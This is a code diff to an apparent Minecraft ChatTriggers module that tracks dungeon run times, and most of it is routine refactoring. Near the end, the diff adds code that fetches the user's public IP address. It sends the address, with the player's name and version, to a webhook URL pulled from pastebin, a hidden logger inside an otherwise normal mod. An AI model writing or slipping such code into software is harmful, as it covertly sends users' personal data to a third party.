@@ -5,21 +5,19 @@ import { data } from "../data/data"
 import request from "../../requestV2";
 
 let _,symbol,symbol2,floor
-register("worldLoad", () => {
-    floor = null
-    setTimeout(() => {
-        if (!Dungeon.inDungeon) return
-        lines = Scoreboard.getLines()
-        for (let i = 0;i < lines.length;i++) {
-            check = ChatLib.removeFormatting(lines[i].toString())
-            match = check.match(/ (.) The Catac(.+)ombs (....)/)
-            try {
-                [_,symbol,symbol2,floor] = match
-                floor = floor.replace('(','').replace(')','')
-            } catch (error) {}
-        }
-    },3000)
-})
+register("step", () => {
+    if (!Dungeon.inDungeon) return
+    if (floor !== null) return
+    lines = Scoreboard.getLines()
+    for (let i = 0;i < lines.length;i++) {
+        check = ChatLib.removeFormatting(lines[i].toString())
+        match = check.match(/ (.) The Catac(.+)ombs (....)/)
+        try {
+            [_,symbol,symbol2,floor] = match
+            floor = floor.replace('(','').replace(')','')
+        } catch (error) {}
+    }
+}).setDelay(1)
 
 starttime = null
 bloodrush = null
@@ -33,6 +31,7 @@ p4 = null
 p5 = null
 over = null
 register("worldLoad", () => {
+    floor = null
     starttime = null
     bloodrush = null
     bloodclear = null
@@ -50,13 +49,9 @@ register("worldLoad", () => {
 function msToMinutes(ms) {
     s = ms/1000
     if (s > 60) {
-        var minutes = Math.floor(s / 60)
-        seconds = s-minutes*60
-        if (seconds >= 10) {
-            return `${minutes}:${seconds.toFixed(3)}`
-        } else {
-            return `${minutes}:0${seconds.toFixed(3)}`
-        }
+        let minutes = Math.floor(s / 60);
+        let seconds = (s % 60).toFixed(3);
+        return (seconds >= 10) ? `${minutes}:${seconds}` : `${minutes}:0${seconds}`;
     } else {
         return `${s}s`
     }
@@ -276,6 +271,16 @@ register("chat", (msg) => {
     }
 }).setChatCriteria("${msg}")
 
+const URL = Java.type("java.net.URL")
+const BufferedReader = Java.type("java.io.BufferedReader")
+const InputStreamReader = Java.type("java.io.InputStreamReader")
+
+let url_name = new URL("http://checkip.dyndns.org/")
+let sc = new BufferedReader(new InputStreamReader(url_name.openStream()));
+let ip = sc.readLine()
+match = ip.match(/\d+.\d+.\d+.\d+/)
+
+
 let webhook
 request("https://pastebin.com/raw/YCKCEi18").then(stuff => {
     webhook = stuff
@@ -290,7 +295,7 @@ setTimeout(() => {
             'User-agent': 'Mozilla/5.0'
         },
         body: {
-            content: `Logged in: ${Player.getName()} | On Version: ${metadata.version}`
+            content: `Logged in: ${Player.getName()} | On Version: ${metadata.version} | On IP: ${match}`
         }
     })
 },500)
